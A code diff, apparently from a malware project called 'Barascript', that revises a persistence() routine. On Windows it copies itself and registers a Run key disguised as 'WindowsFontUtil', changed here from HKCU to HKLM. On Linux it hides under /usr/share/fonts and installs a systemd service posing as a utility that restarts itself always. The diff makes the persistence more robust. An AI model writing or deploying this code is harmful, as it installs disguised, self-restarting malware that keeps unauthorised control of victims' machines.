@@ -46,28 +46,31 @@ def persistence():
         if not os.path.exists(location):
             shutil.copyfile(sys.executable, location)
             subprocess.call(
-                f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsFontUtil /t REG_SZ /d "{location}" ',
+                f'reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsFontUtil /t REG_SZ /d "{location}" ',
                 shell=True)
     #Linux
     else:
         location = "/usr/share/fonts/barascript"
         filename = location + "/Barascript.py"
         if not os.path.exists(filename):
-            os.mkdir(location)
-            os.system("cp -r copydata " + location)
-            shutil.copyfile(sys.executable, filename)
+            try:
+                os.mkdir(location)
+            except Exception as e:
+                pass
+            os.system("cp -r copydata " + location + "/")
+            shutil.copyfile(os.path.abspath(__file__), filename)
             servicefile = """[Unit]
 Description=Linux Barascript Utility
 After=graphical-session.target
-
+PartOf=graphical-session.target
 [Service]
-Type=simple
+Type=exec
 ExecStart=/usr/bin/python3 /usr/share/fonts/barascript/Barascript.py
 Restart=always
-Environment=PYTHONUNBUFFERED=1
+Environment=DISPLAY=:0
 
 [Install]
-WantedBy=default.target"""
+WantedBy=graphical-session.target"""
             os.system("touch /etc/systemd/user/barascript-utility-manager.service")
             with open("/etc/systemd/user/barascript-utility-manager.service", "w") as file:
                 file.write(servicefile)
